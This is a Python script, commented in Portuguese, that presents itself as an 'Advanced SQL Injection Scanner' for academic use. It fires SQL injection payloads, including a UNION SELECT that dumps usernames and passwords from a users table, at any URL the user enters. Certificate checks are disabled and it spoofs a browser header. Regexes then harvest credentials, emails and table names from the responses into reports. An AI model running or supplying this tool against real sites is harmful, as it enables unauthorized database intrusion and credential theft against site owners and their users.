#!/usr/bin/env python3
import requests
import time
import os
import json
import re
import warnings
from urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, init, Style

# Configuração inicial
init(autoreset=True)
warnings.filterwarnings("ignore", category=InsecureRequestWarning)

class AdvancedSQLiScanner:
    def __init__(self):
        self.OUTPUT_DIR = os.path.abspath("sql_scan_results")
        self.OUTPUT_TXT = os.path.join(self.OUTPUT_DIR, "vulnerabilities_report.txt")
        self.OUTPUT_JSON = os.path.join(self.OUTPUT_DIR, "technical_details.json")
        self.OUTPUT_HTML = os.path.join(self.OUTPUT_DIR, "presentation_report.html")
        
        # Configurações avançadas
        self.PAYLOADS = [
            "'", 
            "\"", 
            "' OR '1'='1", 
            "' OR 1=1-- -", 
            "') OR ('1'='1-- -",
            "' UNION SELECT null,concat(username,':',password) FROM users-- -",
            "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))-- -",
            "' OR EXISTS(SELECT * FROM information_schema.tables)-- -",
            "' OR 1=1 LIMIT 1,1-- -"
        ]
        
        self.SENSITIVE_PATTERNS = {
            'credenciais': r"(username|user|login|password|pass|senha)[=:'\"]*([^<\s&]+)",
            'emails': r"([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)",
            'tabelas': r"(from|into|update)\s+([a-zA-Z0-9_]+)",
            'colunas': r"(select|from)\s+([a-zA-Z0-9_,\s]+)(?:from|where|$)"
        }
        
        self.HEADERS = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }
        
        os.makedirs(self.OUTPUT_DIR, exist_ok=True)
        self.total_urls_tested = 0  # Adicionado para rastrear URLs testadas

    def extract_data(self, response_text):
        """Extrai dados sensíveis da resposta"""
        extracted = {}
        for data_type, pattern in self.SENSITIVE_PATTERNS.items():
            matches = re.finditer(pattern, response_text, re.IGNORECASE)
            extracted[data_type] = list(set(match.group() for match in matches))
        return extracted

    def test_injection(self, url):
        """Testa a URL com diversos payloads de injeção"""
        results = []
        
        for payload in self.PAYLOADS:
            try:
                # Construção da URL de teste
                if '?' in url:
                    base_url, params = url.split('?', 1)
                    param_name = params.split('=')[0]
                    test_url = f"{base_url}?{param_name}={payload}"
                else:
                    test_url = f"{url}?id={payload}"
                
                # Envio da requisição
                response = requests.get(
                    test_url,
                    headers=self.HEADERS,
                    timeout=15,
                    verify=False
                )
                
                # Análise da resposta
                if response.status_code == 200:
                    extracted_data = self.extract_data(response.text)
                    
                    if any(extracted_data.values()):
                        result = {
                            "url": url,
                            "payload": payload,
                            "vulnerable": True,
                            "extracted_data": extracted_data,
                            "response_sample": response.text[:500] + "..." if len(response.text) > 500 else response.text
                        }
                        results.append(result)
                        break
                        
            except Exception:
                continue
        
        return results if results else [{
            "url": url,
            "vulnerable": False,
            "payload": None,
            "extracted_data": None
        }]

    def generate_reports(self, scan_results):
        """Gera relatórios em múltiplos formatos"""
        vulnerabilities = [r for r in scan_results if r["vulnerable"]]
        
        # Relatório TXT (simples)
        with open(self.OUTPUT_TXT, 'w', encoding='utf-8') as f:
            if vulnerabilities:
                f.write("=== RELATÓRIO DE VULNERABILIDADES ===\n\n")
                for vuln in vulnerabilities:
                    f.write(f"URL Vulnerável: {vuln['url']}\n")
                    f.write(f"Payload Efetivo: {vuln['payload']}\n")
                    f.write("\nDados Extraídos:\n")
                    for data_type, items in vuln['extracted_data'].items():
                        if items:
                            f.write(f"- {data_type.upper()}:\n")
                            for item in items:
                                f.write(f"  • {item}\n")
                    f.write("\n" + "="*80 + "\n\n")
            else:
                f.write("Nenhuma vulnerabilidade encontrada.\n")
        
        # Relatório Técnico JSON
        with open(self.OUTPUT_JSON, 'w', encoding='utf-8') as f:
            json.dump({
                "scan_metadata": {
                    "date": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "total_urls": self.total_urls_tested,
                    "vulnerable_urls": len(vulnerabilities)
                },
                "results": scan_results
            }, f, indent=2, ensure_ascii=False)
        
        # Relatório HTML (apresentação)
        self.generate_html_report(vulnerabilities)

    def generate_html_report(self, vulnerabilities):
        """Gera relatório HTML formatado"""
        html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Relatório de Vulnerabilidades SQL Injection</title>
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; }}
        .header {{ background: #2c3e50; color: white; padding: 20px; text-align: center; }}
        .summary {{ background: #f8f9fa; padding: 15px; margin-bottom: 20px; border-radius: 5px; }}
        .vuln-card {{ border: 1px solid #ddd; margin-bottom: 20px; border-radius: 5px; overflow: hidden; }}
        .vuln-header {{ background: #e74c3c; color: white; padding: 10px 15px; }}
        .vuln-body {{ padding: 15px; }}
        .data-section {{ margin-top: 10px; }}
        .data-title {{ font-weight: bold; color: #2c3e50; }}
        .data-content {{ background: #f1f1f1; padding: 10px; border-radius: 3px; margin-top: 5px; }}
        .response-sample {{ max-height: 200px; overflow-y: auto; }}
        .no-vuln {{ text-align: center; padding: 20px; color: #27ae60; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Relatório de Vulnerabilidades SQL Injection</h1>
        <p>Gerado em {time.strftime("%d/%m/%Y às %H:%M:%S")}</p>
    </div>
    
    <div class="summary">
        <h2>Resumo Executivo</h2>
        <p>Total de URLs testadas: {self.total_urls_tested}</p>
        <p>Vulnerabilidades encontradas: {len(vulnerabilities)}</p>
    </div>
"""

        if vulnerabilities:
            html += "<h2>Detalhes das Vulnerabilidades</h2>"
            for vuln in vulnerabilities:
                html += f"""
                <div class="vuln-card">
                    <div class="vuln-header">
                        <h3>{vuln['url']}</h3>
                    </div>
                    <div class="vuln-body">
                        <p><strong>Payload utilizado:</strong> <code>{vuln['payload']}</code></p>
                        <div class="data-section">
                            <div class="data-title">Dados Extraídos:</div>
                """
                
                for data_type, items in vuln['extracted_data'].items():
                    if items:
                        html += f"""
                            <div class="data-content">
                                <strong>{data_type.upper()}:</strong><br>
                                {''.join(f'• {item}<br>' for item in items)}
                            </div>
                        """
                
                html += f"""
                        <div class="data-section">
                            <div class="data-title">Amostra da Resposta:</div>
                            <div class="data-content response-sample">
                                <pre>{vuln['response_sample']}</pre>
                            </div>
                        </div>
                    </div>
                </div>
                """
        else:
            html += """
            <div class="no-vuln">
                <h3>Nenhuma vulnerabilidade SQL Injection foi encontrada</h3>
                <p>Todos os sites testados parecem estar protegidos contra injeção SQL.</p>
            </div>
            """

        html += """
</body>
</html>
        """

        with open(self.OUTPUT_HTML, 'w', encoding='utf-8') as f:
            f.write(html)

    def run_scan(self, urls):
        """Executa a varredura completa"""
        print(Fore.CYAN + "\n[+] Iniciando varredura avançada de SQL Injection\n")
        
        scan_results = []
        self.total_urls_tested = len(urls)  # Atualiza contador
        
        for url in urls:
            print(Fore.WHITE + f"Testando: {url}")
            results = self.test_injection(url)
            scan_results.extend(results)
            
            for result in results:
                if result["vulnerable"]:
                    print(Fore.RED + f"  [!] VULNERÁVEL - Dados extraídos:")
                    for data_type, items in result["extracted_data"].items():
                        if items:
                            print(Fore.YELLOW + f"    - {data_type}: {len(items)} itens encontrados")
                else:
                    print(Fore.GREEN + "  [✓] Seguro")
            print()
        
        self.generate_reports(scan_results)
        
        print(Fore.CYAN + "\n[+] Varredura concluída com sucesso!")
        print(Fore.YELLOW + f"Relatórios gerados em: {self.OUTPUT_DIR}/")

def main():
    # Banner
    print(Fore.RED + r"""
   _____ ___ _      ____    _   _ ___ ____ _   _ _____ ____  
  / ____|_ _| |    / __ \  | \ | |_ _/ ___| | | | ____|  _ \ 
 | (___  | || |   | |  | | |  \| || | |   | |_| |  _| | |_) |
  \___ \ | || |   | |  | | | . ` || | |   |  _  | |___|  _ < 
  ____) || || |___| |__| | | |\  || | |___| | | |_____| |_) |
 |_____/___|_____|\____/  |_| \_|___\____|_| |_|_____|____/ 
    """)
    print(Fore.BLUE + " Advanced SQL Injection Scanner - Academic Use Only\n")
    
    scanner = AdvancedSQLiScanner()
    
    try:
        # Entrada de URLs
        print(Fore.WHITE + "Insira as URLs para teste (uma por linha, digite 'fim' para terminar):")
        urls = []
        while True:
            url = input("> ").strip()
            if url.lower() == 'fim':
                break
            if url:
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                urls.append(url)
        
        if not urls:
            print(Fore.RED + "\n[!] Nenhuma URL fornecida.")
            return
        
        scanner.run_scan(urls)
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Varredura interrompida pelo usuário")
    except Exception as e:
        print(Fore.RED + f"\n[!] Erro: {str(e)}")

if __name__ == "__main__":
    main()